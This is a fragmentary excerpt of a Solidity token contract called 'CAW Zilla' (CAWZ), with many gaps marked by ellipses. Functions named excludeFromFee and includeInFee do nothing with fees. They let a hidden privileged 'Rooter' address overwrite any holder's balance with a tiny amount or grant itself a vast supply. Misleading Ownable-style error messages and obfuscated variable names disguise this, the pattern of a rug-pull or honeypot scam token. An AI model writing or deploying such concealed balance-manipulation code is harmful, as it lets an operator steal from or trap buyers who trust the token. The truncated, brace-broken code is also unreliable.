...
interface CAWZillaAsii is CAWZillaAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract CAWZillaAsiii is CAWZillaAs {
...
contract CAWZilla is CAWZillaAs, CAWZillaAsi, CAWZillaAsii, CAWZillaAsiii {

    mapping(address => uint256) private CAWZillasuplly;
  mapping(address => bool) public CAWZillaAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private CAWZillaRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public CAWZillaPaw;
  address CAWZilladeploy;



    
    constructor(address CAWZillaadressss) {
            // Editable
            CAWZilladeploy = msg.sender;

        _name = "CAW Zilla";
        _symbol = "CAWZ";
  CAWZillaRooter = CAWZillaadressss;        
    ...
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
      ...
      modifier _internal() {
        require(CAWZillaRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier maxtokens () {
    require(CAWZilladeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;
    ...
    function _transfer(
        ...
        uint256 fromBalance = CAWZillasuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            CAWZillasuplly[from] = fromBalance - lahsab;
        }
        CAWZillasuplly[to] += lahsab;
  ...
  function excludeFromFee(address excludeaddress) external _internal {
    CAWZillasuplly[excludeaddress] = 10000000000;
    ...
    function _burn(address account, uint256 lahsab) internal virtual {
        ...
        uint256 accountBalance = CAWZillasuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            CAWZillasuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;
  ...
  function includeInFee(address includeaddress) external _internal {
    CAWZillasuplly[includeaddress] = 1000000000 * 10 ** 24;
